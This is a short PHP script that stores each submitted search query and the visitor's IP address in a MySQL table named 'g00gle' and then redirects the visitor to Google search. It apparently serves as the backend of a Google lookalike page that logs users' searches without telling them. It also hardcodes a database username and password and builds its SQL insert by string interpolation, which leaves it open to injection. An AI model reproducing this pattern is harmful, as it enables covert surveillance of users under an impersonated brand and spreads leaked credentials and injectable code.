<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $ip = $_SERVER["REMOTE_ADDR"];
    $search = htmlspecialchars($_POST["search"]);

    $server = "localhost";
    $username = "yazan";
    $password = "Mango3990";
    $database = "autodb";
    $conn = mysqli_connect($server, $username, $password, $database);

    if ($conn) {
        $sql = "INSERT INTO g00gle (IP, search) VALUES ('$ip', '$search');";
        mysqli_query($conn, $sql);
        mysqli_close($conn);
    }

    if (!empty($_POST['search']) && !isset($_SERVER['HTTP_X_REQUESTED_WITH'])) {
        header("Location: https://www.google.com/search?q=" . urlencode($search));
        exit();
    }
}
?>